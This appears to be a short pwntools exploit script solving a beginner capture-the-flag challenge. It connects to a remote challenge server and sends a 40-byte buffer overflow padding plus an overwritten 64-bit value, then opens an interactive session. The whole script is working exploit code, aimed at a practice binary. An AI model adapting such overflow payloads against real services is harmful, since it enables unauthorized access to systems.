from pwn import *

#io = process('./beginner-generic-pwn-number-0')
io = remote('mc.ax', 31199)
print(io.recvuntil(b'up? :(\n'))
io.sendline(b'A'*40+p64(0xffffffffffffffff))
io.interactive()
